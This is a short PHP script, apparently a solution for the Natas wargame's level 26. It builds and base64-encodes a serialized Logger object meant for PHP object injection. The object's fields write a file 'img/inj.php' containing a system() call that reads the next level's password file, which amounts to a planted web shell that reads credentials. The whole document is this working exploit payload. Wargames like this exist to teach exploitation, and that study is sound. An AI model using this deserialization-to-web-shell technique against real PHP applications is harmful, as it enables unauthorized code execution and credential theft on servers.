<?php

    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct(){
            // initialise variables
            $this->initMsg = "# Anything";
            $this->exitMsg = "<?php system('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "img/inj.php";
		}                                        
	}

	$inj = new Logger();
	echo(base64_encode(serialize($inj)));

?>